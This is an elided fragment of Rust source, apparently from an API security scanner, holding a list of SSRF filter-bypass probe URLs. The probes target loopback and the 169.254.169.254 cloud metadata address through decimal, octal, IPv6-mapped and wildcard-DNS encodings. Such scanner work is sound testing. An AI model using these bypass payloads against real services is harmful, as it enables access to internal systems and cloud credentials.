...
pub(crate) const BYPASS_PROBES: &[SsrfBypass] = &[
    ...
    SsrfBypass {
        ...
        description: "IPv4-mapped IPv6 loopback",
    },
    SsrfBypass {
        url: "http://[::ffff:7f00:1]/",
        description: "IPv4-mapped IPv6 loopback (hex)",
    },
    SsrfBypass {
        url: "http://2130706433/",
        description: "127.0.0.1 en décimal (2130706433)",
    },
    SsrfBypass {
        url: "http://2852039166/",
        description: "169.254.169.254 en décimal",
    },
    SsrfBypass {
        url: "http://0177.0.0.1/",
    ...
    SsrfBypass {
        ...
        description: "127.0.0.1 URL-encoded",
    },
    SsrfBypass {
        url: "http://127.0.0.1.nip.io/",
        description: "nip.io wildcard DNS → 127.0.0.1",
    },
    SsrfBypass {
        url: "http://localtest.me/",
        description: "localtest.me → 127.0.0.1",
    },
];
                ...
                let spec_url_params: Vec<String> = ep
                    ...
                    .filter(|p| {
                        matches!(
                            ...
                            .iter()
                            .any(|known| p.name.to_lowercase().contains(known))
                    })
                    .map(|p| p.name.clone())
                    .collect();
